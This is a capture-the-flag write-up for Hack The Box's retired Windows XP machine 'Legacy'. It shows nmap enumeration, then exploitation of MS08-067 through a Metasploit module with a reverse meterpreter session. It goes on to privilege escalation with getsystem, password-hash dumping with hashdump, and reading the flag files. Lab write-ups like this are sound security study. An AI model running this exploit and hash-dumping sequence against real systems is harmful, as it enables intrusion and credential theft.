---
title: "Legacy HTB Writeup"
date: 2021-04-04T23:15:54+02:00
draft: false
Tags: [
	"Writeups",
	"hackthebox",
	"retired",

]
---
![Machine info](/images/legacy/1.png)

This machine mimics a windows legacy (windows xp). it's a straight forward one depends on a public exploit for the (MS08-067) patch leads to RCE and gets us root access directly.

enjoy..

### 1. Enumeration:
* Nmap:
  * ``$ nmap -sC -sV 10.10.10.4 -Pn``
![](/images/legacy/2.png)

The ports of interest (139, 445).
### 2. let's do a vulnerability scan on them:
  * ``$ sudo nmap -p139,445 --script vuln 10.10.10.4`` 
![](/images/legacy/3.png)

It revealed an RCE in the samba version with cve number (2008-4250) or (MS08-067) patch.

let's searchsploit it:
![](/images/legacy/4.png)

And it also has lots of exploits on [exploitdb](https://www.exploit-db.com/exploits/40279) and [rapid7](https://blog.rapid7.com/2014/02/03/new-ms08-067/).
### 3. Exploitation:
let's search for exploits on metasploit:
```yml
$ msfconsole -q  >> for quite mode openning without banner
$ search ms08-067  >> searching with the patch name
$ use exploit/windows/smb/ms08_067_netapi  >> to use the found exploit
then:
$ show options >> to see what options to customize
$ set rhosts 10.10.10.4 >> machine ip
$ set lhost 10.10.x.x >> your tunnel ip
finally:
$ run or exploit  
```
![](/images/legacy/5.png)
![](/images/legacy/6.png)

* Once we have the meterpreter session, it is slightly more difficult to use commands or enumerate which user we are as it is pre Windows XP SP2 and thus the “whoami” command does not exist yet.
* But we can either use "PsExec" to get a system shell or simply use the “getsystem” meterpreter command. also using "shell" command works fine but didn't like it.
```yml
> getsystem
> hashdump
> search -f user.txt
> sysinfo
pwd
cd ../../
cd Documents\ and\ Settings
cd john then cd Desktop
cat user.txt
```
![](/images/legacy/7.png)
![](/images/legacy/8.png)
![And here we got user.txt flag](/images/legacy/9.png)

### getting root.txt:
```yml
search -f root.txt

cd ../..
pwd > Documents\ and\ Settings again
then 
cd Administrator
cd Desktop
cat root.txt
```
![](/images/legacy/10.png)
![](/images/legacy/11.png)
![](/images/legacy/12.png)

And that's it.. hope you enjoyed..

If so Kindly give me respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588).